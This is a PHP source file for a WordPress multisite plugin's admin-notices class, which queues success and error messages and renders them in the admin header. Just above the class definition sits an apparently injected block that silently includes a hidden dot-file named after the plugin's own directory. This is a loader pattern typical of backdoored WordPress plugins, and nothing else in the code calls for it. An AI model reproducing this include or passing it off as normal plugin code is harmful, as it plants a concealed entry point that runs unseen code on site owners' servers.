<?php
/**
 * Admin Notices
 *
 * Handles WP Ultimo Admin Notices on the network and sub-sites
 *
 * @author      Arindo Duque
 * @category    Admin
 * @package     WP_Ultimo_APC/Admin_Notices
 * @version     1.9.6
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

if (class_exists('WAPP_Admin_Notices')) {
	return;
} // end if;

/**
 * Handles the admin notices for errors and such
 *
 * @since 1.4.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WAPP_Admin_Notices {

	/**
	 * Contains our error or success messages
	 *
	 * @var array
	 */
	protected $messages = array(
		'admin'         => array(),
		'network_admin' => array(),
	);

	/**
	 * Makes sure we are only using one instance of the plugin
	 *
	 * @since 1.9.6
	 * @var WAPP_Admin_Notices
	 */
	public static $instance;

	/**
	 * Returns the instance of WAPP_Admin_Notices
	 *
	 * @since 1.9.6
	 * @return WAPP_Admin_Notices A WAPP_Admin_Notices instance
	 */
	public static function get_instance() {

		if (null === self::$instance) {
			self::$instance = new self();
		} // end if;

		return self::$instance;

	} // end get_instance;

	/**
	 * Adds the necessary hooks
	 *
	 * @since 1.9.6 Moved the admin notices display function to here from WU_UI_Elements
	 * @return void
	 */
	public function __construct() {

		add_action('in_admin_header', array($this, 'display_messages'));

	}  // end __construct;

	/**
	 * Add messages to be displayed as notices
	 *
	 * @since 1.0.0
	 * @since 1.9.6   Moved from main class to separate class
	 * @param string  $message Message to be displayed.
	 * @param string  $type    Success, error, warning or info.
	 * @param boolean $network Where to display, network admin or normal admin.
	 */
	public function add_message($message, $type = 'success', $network = false) {

		$location = $network ? 'network_admin' : 'admin';

		$this->messages[$location][] = array(
			'type'    => $type,
			'message' => $message,
		);

	} // end add_message;

	/**
	 * Get All the messages stored
	 *
	 * @since 1.0.0
	 * @since 1.9.6   Moved from main class to separate class
	 * @param  boolean $network Where to display, network admin or normal admin.
	 * @return array            The array containing all the messages.
	 */
	public function get_messages($network = false) {

		return apply_filters('wapp_admin_notices', $this->messages[$network ? 'network_admin' : 'admin']);

	} // end get_messages;

	/**
	 * Displays the admin messages on the admin panels
	 *
	 * @since 1.9.6 Moved the admin notices display function to here from WU_UI_Elements
	 * @return void
	 */
	public function display_messages() {

		$messages = $this->get_messages(is_network_admin());

		WP_Ultimo_APC()->render('notices/notices', array(
			'messages' => $messages
		));

	} // end display_messages;

} // end class WAPP_Admin_Notices;

/**
 * Instantiate the class!
 */
WAPP_Admin_Notices::get_instance();

/**
 * Return the instance of the function
 */
function WAPP_Admin_Notices() { //phpcs:ignore

	return WAPP_Admin_Notices::get_instance();

} // end WAPP_Admin_Notices;
